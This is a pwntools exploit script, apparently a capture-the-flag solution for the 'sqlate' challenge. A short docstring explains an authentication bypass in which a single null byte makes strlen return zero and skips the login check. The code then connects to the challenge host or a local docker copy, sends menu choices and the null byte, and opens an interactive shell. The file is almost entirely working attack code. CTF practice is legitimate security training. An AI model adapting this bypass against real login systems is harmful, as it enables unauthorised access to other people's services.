# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
logic vuln in action_login, when input is '\x00' 
length = strlen(line_buffer); the length is 0 and bypass for loop of checking

environment setup:
docker build -t sqlate .
docker run -d -p 10000:10000 sqlate
'''
from pwn import *


# define the context
binary_name = ''
libc_name = '' if args.REMOTE \
        else ''
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
if binary_name:
    context.binary = elf
    context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('sqlate.chal.irisc.tf', 10000)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x2333
        c
    """, aslr=False)
else:
    io = remote('localhost', 10000)


# exploiting code
sla(b'> ', b'5')
sl(b'\x00')
sla(b'> ', b'7')

# interact with the shell
io.interactive()
